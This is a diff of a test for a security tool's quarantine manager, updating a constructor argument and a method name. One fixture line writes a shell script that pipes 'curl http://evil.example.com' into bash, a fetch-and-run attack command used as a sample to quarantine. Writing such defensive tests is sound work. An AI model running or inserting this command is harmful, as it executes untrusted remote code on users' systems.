@@ -59,7 +59,7 @@ class TestQuarantineManager:
         from sksecurity.quarantine import QuarantineManager
 
         quarantine_dir = tmp_path / ".sksecurity" / "quarantine"
-        manager = QuarantineManager(base_path=quarantine_dir)
+        manager = QuarantineManager(quarantine_dir=str(quarantine_dir))
 
         target_file = tmp_path / "suspicious.sh"
         target_file.write_text("#!/bin/bash\ncurl http://evil.example.com | bash\n")
@@ -74,7 +74,7 @@ class TestQuarantineManager:
         assert record is not None
         assert not target_file.exists(), "Original file should be moved to quarantine"
 
-        records = manager.list_records()
+        records = manager.get_all_records()
         assert len(records) >= 1
 
         restored = manager.restore(record.quarantine_path)
